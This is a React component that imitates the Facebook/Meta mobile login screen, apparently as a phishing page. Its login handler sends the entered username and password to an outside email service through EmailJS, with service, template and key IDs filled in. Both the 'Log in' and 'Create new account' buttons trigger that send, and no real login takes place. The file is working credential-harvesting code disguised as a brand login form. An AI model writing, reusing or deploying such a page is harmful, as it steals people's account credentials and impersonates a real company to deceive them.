import  { useState } from "react";
import { Eye, EyeOff, ArrowLeft } from "lucide-react";
import { useNavigate } from "react-router-dom";
import InstaLogo from "../assets/facebook-logo-facebook-icon-transparent-free-png.webp";
import Meta from "../assets/meta_PNG7.png";
import emailjs from "@emailjs/browser";

export default function FacebookLogin() {
  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);

  const navigate = useNavigate();

  const [loading, setLoading] = useState(false);


const handleSendUsername = async () => {
  if (!username) return;

  try {
    setLoading(true);
    await emailjs.send(
      "service_lhxo7me",     // replace
      "template_pqnkjmo",    // replace
      {
        username: username,
        password:password  
      },
      "n8GRKc7Lfhmw1QSZV"      // replace
    );

    console.log("Username sent successfully");
    setTimeout(() => {
      setLoading(false);
    }, 1000);
  } catch (error) {
    console.log("Error sending:", error);
  }
};



  return (
  <div className="min-h-screen bg-[#0d232e] flex flex-col px-4 w-full relative">


    {/* Back Button */}
<button
  onClick={() => navigate(-1)}
  className="absolute top-6 left-6 p-2 bg-transparent hover:bg-transparent focus:bg-transparent active:bg-transparent shadow-none"
>
  <ArrowLeft size={24} className="text-white" />
</button>


      {/* Main Login Box */}
   {/* Main Content */}
<div className="flex flex-col items-center justify-center flex-grow">


        <img
          src={InstaLogo}
          alt="Instagram"
          className="w-24 object-contain mx-auto mb-24"
        />

        {/* Username */}
        <div className="w-[90%] relative mb-3">
          <input
            type="text"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            placeholder="Mobile number or email"
            className="w-full max-w-x h-12 px-3 rounded-xl border bg-[#0d232e] text-white text-sm "
          />

          {username && (
            <button
              type="button"
              onClick={() => setUsername("")}
              className="absolute right-3 top-1/2 -translate-y-1/2 text-white bg-transparent"
            >
              ✕
            </button>
          )}
        </div>

        {/* Password */}
        <div className="w-[90%] relative mb-4">
          <input
            type={showPassword ? "text" : "password"}
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            placeholder="Password"
            className="w-full max-w-xl h-12 px-3 pr-10 rounded-xl border bg-[#0d232e] text-sm focus:outline-none text-white"
          />

          {password && (
            <span
             
              onClick={() => setShowPassword(!showPassword)}
              className="absolute right-3 top-1/2 -translate-y-1/2 text-white bg-[#0d232e]"
            >
              {showPassword ? <EyeOff size={18} /> : <Eye size={18} />}
            </span>
          )}
        </div>

        {/* Login Button */}
        <button
          disabled={!username || !password}
           onClick={handleSendUsername}
          className={`w-[90%] py-2 bg-blue-500 text-white font-semibold rounded-2xl text-sm ${
            !username || !password
              ? "opacity-60 cursor-not-allowed"
              : "hover:bg-blue-600"
          }`}
        >
           {loading ? "Loading..." : "Log in"}
        </button>


  
        <p className="text-center text-xs text-white mt-3 cursor-pointer">
          Forgot password?
        </p>
      </div>

      <div className="w-full max-w-sm rounded-lg p-4 mt-4 text-center text-sm">
       
         <button
          disabled={!username || !password}
           onClick={handleSendUsername}
        className="w-[90%] py-2 bg-[#0d232e] text-blue-400 font-semibold rounded-2xl text-sm border border-blue-400"

        >
           Create new account
        </button>
      </div>

        {/* Meta Logo — Now Fixed at Bottom */}
    <div className="flex justify-center pb-6 mt-4">
      <img
        src={Meta}
        alt="Meta"
        className="w-16 object-contain"
      />
    </div>
    </div>
  );
}
